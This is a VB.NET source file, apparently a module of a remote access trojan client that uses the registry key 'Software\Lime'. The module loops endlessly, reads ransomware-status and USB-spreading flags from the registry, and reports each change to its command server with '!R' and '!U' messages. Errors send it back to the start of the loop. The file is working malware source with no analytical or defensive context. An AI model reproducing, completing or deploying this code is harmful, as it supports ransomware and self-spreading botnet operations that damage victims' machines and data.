Imports System.Threading

Public Class CHK_REG
    Private Shared SPL = Main.SPL
    Private Shared C = Main.C

    Public Shared Sub Checking()
        Thread.CurrentThread.Sleep(5000)
        Dim Old2 As String = ID.USBSP
        Dim Old As String = ID.Ransomeware
1:
        Try

            While True 'Infinity loop

                'Compare old string with new string
                'The client will old use send function IF the string has been changed

                Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing)
                If Old <> readValue.ToString Then
                    Old = readValue
                    C.Send("!R" & SPL & readValue.ToString)
                End If

                If Settings.USB Then
                    Dim readValue2 = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "USB", Nothing)
                    If Old2 <> readValue2.ToString Then
                        Old2 = readValue2
                        C.Send("!U" & SPL & readValue2.ToString)
                    End If
                End If


                Thread.CurrentThread.Sleep(3000) 'sleep to reduce cpu usage
            End While
        Catch ex As Exception
            GoTo 1
        End Try
    End Sub

End Class
